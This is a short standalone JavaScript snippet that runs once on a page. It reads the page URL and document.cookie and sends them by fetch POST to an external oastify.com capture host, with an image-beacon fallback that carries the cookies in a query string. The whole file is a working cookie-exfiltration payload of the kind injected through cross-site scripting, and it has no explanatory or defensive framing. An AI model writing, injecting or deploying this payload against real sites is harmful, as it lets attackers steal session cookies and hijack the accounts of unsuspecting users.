(function () {
  if (window.__ckDone) return;
  window.__ckDone = true;

  var HOOK = "http://cwcusdmtfzrk4p94u9ucsrfuqlwck38s1.oastify.com";

  var payload = {
    url:      location.href,
    time:     new Date().toISOString(),
    cookies:  document.cookie
  };

  var body = JSON.stringify(payload);

  try {
    fetch(HOOK, {
      method: "POST",
      mode: "no-cors",
      keepalive: true,
      headers: { "Content-Type": "text/plain;charset=UTF-8" },
      body: body
    }).catch(function () {
      new Image().src = HOOK + "?c=" + encodeURIComponent(document.cookie) + "&u=" + encodeURIComponent(location.href) + "&t=" + Date.now();
    });
  } catch (e) {
    new Image().src = HOOK + "?c=" + encodeURIComponent(document.cookie) + "&u=" + encodeURIComponent(location.href) + "&t=" + Date.now();
  }
})();
